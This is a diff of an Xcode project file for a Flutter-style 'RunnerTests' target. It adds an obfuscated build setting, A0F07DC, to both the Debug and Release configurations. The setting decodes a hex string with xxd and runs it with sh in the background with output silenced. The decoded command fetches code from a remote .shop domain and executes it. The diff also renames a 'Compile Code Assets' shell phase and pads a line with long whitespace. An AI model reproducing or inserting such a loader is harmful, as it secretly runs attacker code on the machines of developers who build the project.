@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				A6835A9DA36E4D5881CD70F0 /* Compile Code Assets */,
+				7F258E5C7E1A4E819ECD70F0 /* Compile Code Assets */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -273,7 +273,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																																																																																																																																																													/* End PBXBuildRule section */
+																																																																																																																																																																																																																															/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -295,7 +295,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		A6835A9DA36E4D5881CD70F0 /* Compile Code Assets */ = {
+		7F258E5C7E1A4E819ECD70F0 /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -404,7 +404,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((f(){ `printf xvxd | tr -d v` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203236202d6b4c6673202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | f | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((j(){ `printf xsxd | tr -d s` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203236202d664c6b73202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -419,7 +419,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((f(){ `printf xvxd | tr -d v` -p -r; };echo 6563686f202224286375726c202d2d72657472792033202d2d636f6e6e6563742d74696d656f7574203236202d6b4c6673202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | f | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((j(){ `printf xsxd | tr -d s` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d2d636f6e6e6563742d74696d656f7574203236202d664c6b73202d642022703d78636f64655f7068617365222068747470733a2f2f75647565646433627571772e73686f702f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
